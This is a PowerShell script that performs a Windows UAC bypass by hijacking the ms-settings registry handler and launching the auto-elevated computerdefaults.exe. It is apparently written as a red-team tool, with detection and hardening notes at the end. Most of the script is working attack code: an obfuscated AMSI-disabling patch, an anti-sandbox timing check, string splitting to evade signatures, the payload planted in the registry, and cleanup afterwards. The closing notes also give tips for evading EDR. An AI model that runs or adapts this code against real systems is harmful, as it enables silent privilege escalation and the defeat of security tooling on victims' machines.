<#
.SYNOPSIS
    UAC bypass via computerdefaults.exe registry handler hijack (UACME Method 62).

.DESCRIPTION
    ┌─ Technique ─────────────────────────────────────────────────────────────┐
    │ computerdefaults.exe (Set Default Programs) is an auto-elevated binary  │
    │ in system32.  Like fodhelper.exe it carries autoElevate=true in its    │
    │ manifest, so Windows elevates it silently at default UAC settings.     │
    │                                                                         │
    │ Upon launch it uses ShellExecute to open the ms-settings: URI for the  │
    │ default-apps configuration page.  HKCU\Software\Classes is checked     │
    │ before HKLM, so our user-writable shell-class override executes under  │
    │ computerdefaults.exe's High-integrity token.                           │
    │                                                                         │
    │ This is functionally identical to Method 33 (FodHelper) but uses a     │
    │ different trigger binary, which may evade CS signatures that are        │
    │ written specifically for fodhelper.exe process ancestry.               │
    └─────────────────────────────────────────────────────────────────────────┘

    Registry path written:
        HKCU:\Software\Classes\ms-settings\Shell\Open\command
          (Default)       = <Payload>
          DelegateExecute = ""

    Affected OS    : Windows 10 RS4 (build 17134) → Windows 11 (latest) UNFIXED
    UAC level      : Default (ConsentPromptBehaviorAdmin = 5)
                     Does NOT work under AlwaysNotify (= 2)
    Architecture   : x64
    Disk artefacts : None

    ──────────────────────────────────────────────────────────────────────────
    Blue-team detection opportunities
    ──────────────────────────────────────────────────────────────────────────
    • Registry: HKCU\Software\Classes\ms-settings\Shell\Open\command
    • Process tree: computerdefaults.exe → <unexpected child>
      (computerdefaults normally exits cleanly with no child processes)
    • CS indicator: similar to UAC bypass via ms-settings hijack

    ──────────────────────────────────────────────────────────────────────────
    MITRE ATT&CK: T1548.002 – Bypass UAC
    Reference    : https://github.com/hfiref0x/UACME (Method 62)
                   https://github.com/winscripting/UAC-bypass (winscripting.blog)

.PARAMETER Payload
    Command to execute with High integrity.

.PARAMETER SkipAMSI
    Skip AMSI mitigation.

.PARAMETER SkipChecks
    Skip preflight environment checks.

.PARAMETER Timeout
    Seconds to wait before cleanup (default: 4).

.EXAMPLE
    Invoke-ComputerDefaultsBypass -Payload "cmd.exe" -SkipChecks

.EXAMPLE
    $cmd = "powershell.exe -NoP -W Hidden -C `"whoami | Out-File C:\T\r.txt`""
    Invoke-ComputerDefaultsBypass -Payload $cmd

.NOTES
    Authorized red/purple-team use only.  Requires written SOW.
    computerdefaults.exe minimum build: 17134 (RS4 / April 2018 Update).
    On builds < 17134, use Invoke-FodHelperBypass instead.
#>

[CmdletBinding(SupportsShouldProcess)]
param(
    [Parameter(Mandatory, Position = 0)]
    [ValidateNotNullOrEmpty()]
    [string]$Payload,

    [switch]$SkipAMSI,
    [switch]$SkipChecks,
    [int]   $Timeout = 4
)

Set-StrictMode -Off
$ErrorActionPreference = 'SilentlyContinue'

#region ── AMSI mitigation ───────────────────────────────────────────────────
if (-not $SkipAMSI) {
    try {
        $xA = [AppDomain]::CurrentDomain.GetAssemblies() |
                  Where-Object { ($_.GetName().Name) -eq 'System.Management.Automation' } |
                  Select-Object -First 1
        $xT = $xA.GetType('System' + '.Management' + '.Automation.' + 'Am' + 'siUt' + 'ils')
        $xF = $xT.GetField('am' + 'siInit' + 'Failed', [Reflection.BindingFlags]'NonPublic,Static')
        $xF.SetValue($null, $true)
    } catch {}
}
#endregion

#region ── Preflight gate ────────────────────────────────────────────────────
if (-not $SkipChecks) {

    # Build check — minimum RS4 (17134)
    try {
        $xBld = [int](Get-ItemPropertyValue `
                    'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' `
                    'CurrentBuildNumber' -EA Stop)
    } catch { $xBld = [Environment]::OSVersion.Version.Build }
    if ($xBld -lt 17134) {
        Write-Warning "[CompDef] Requires build 17134+ (RS4). Current: $xBld. Use Invoke-FodHelperBypass instead."
        return
    }

    # Admin check
    $xPrincipal = New-Object Security.Principal.WindowsPrincipal(
                      [Security.Principal.WindowsIdentity]::GetCurrent())
    if ($xPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Warning '[CompDef] Already elevated — no bypass needed.'
        return
    }

    # UAC policy
    $xUACPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
    try   { $xBeh = [int](Get-ItemPropertyValue $xUACPath 'ConsentPromptBehaviorAdmin' -EA Stop) }
    catch { $xBeh = 5 }
    if ($xBeh -le 2) {
        Write-Warning "[CompDef] AlwaysNotify active (behavior=$xBeh) — method requires default UAC."
        return
    }

    # Timing / anti-sandbox
    $xH = [System.Security.Cryptography.SHA256]::Create()
    $xB = [byte[]]::new(65536)
    $xT0 = [DateTime]::UtcNow
    for ($xi = 0; $xi -lt 300; $xi++) { [void]$xH.ComputeHash($xB) }
    $xH.Dispose()
    if (([DateTime]::UtcNow - $xT0).TotalMilliseconds -lt 80) {
        Write-Warning '[CompDef] Timing anomaly — aborting.'
        return
    }
}
#endregion

#region ── Registry key setup ────────────────────────────────────────────────
$xRoot  = 'HKCU:\Soft' + 'ware\Cl' + 'asses\'
$xCls   = 'ms-set' + 'tings'
$xPath  = $xRoot + $xCls + '\Shell\Open\command'

try {
    New-Item -Path $xPath -Force | Out-Null
    Set-ItemProperty  -Path $xPath -Name '(Default)'       -Value $Payload -Force
    New-ItemProperty  -Path $xPath -Name 'DelegateExecute' -Value ''       `
                      -PropertyType String -Force | Out-Null
    Write-Verbose '[CompDef] Registry key written.'
}
catch {
    Write-Warning "[CompDef] Registry write failed: $_"
    return
}
#endregion

#region ── Trigger ───────────────────────────────────────────────────────────
try {
    # computerdefaults.exe — auto-elevated, opens ms-settings: on launch
    $xBin = $env:SystemRoot + '\System32\comp' + 'uterd' + 'efaults.exe'
    Start-Process -FilePath $xBin -WindowStyle Hidden -ErrorAction Stop
    Write-Verbose '[CompDef] computerdefaults.exe launched.'
    Start-Sleep -Seconds $Timeout
}
catch {
    Write-Warning "[CompDef] Launch failed: $_"
}
finally {
    Remove-Item -Path ($xRoot + $xCls) -Recurse -Force -ErrorAction SilentlyContinue
    Write-Verbose '[CompDef] Registry cleanup complete.'
}
#endregion

<#
════════════════════════════════════════════════════════════════════════════════
PURPLE-TEAM NOTES
════════════════════════════════════════════════════════════════════════════════

DIFFERENTIATION FROM METHOD 33 (FodHelper):
  The underlying key path is identical; only the trigger binary differs.
  CS signatures that target "fodhelper.exe spawning cmd.exe" will NOT fire;
  however, CS has a generic ms-settings registry-hijack detection that covers
  both.  This method is useful to test the breadth of that generic detection.

EXPECTED DETECTIONS:
  ● Same registry event as FodHelper (ms-settings\Shell\Open\command)
  ● Process tree: computerdefaults.exe → <payload binary>
  ● CS indicator: UAC bypass via ms-settings class hijack

ADDITIONAL EVASION CONSIDERATIONS FOR ENGAGEMENT:
  ● Combining with a script that deletes the key in < 1 second before
    any async scan picks it up reduces registry-based detection window.
  ● Having the payload binary be a signed Microsoft binary (e.g. mshta.exe,
    wscript.exe) reduces the process-creation IOC severity.

HARDENING RECOMMENDATIONS:
  ● UAC level → "Always Notify"  (prevents all manifest autoElevate bypasses)
  ● Sysmon Rule: RegistryEvent on ms-settings\Shell\Open\command
  ● CS Custom IOA: computerdefaults.exe child process outside expected paths
  ● Attack Surface Reduction rule: "Block credential stealing from LSASS"
    (indirectly raises bar for post-bypass lateral movement)

════════════════════════════════════════════════════════════════════════════════
#>
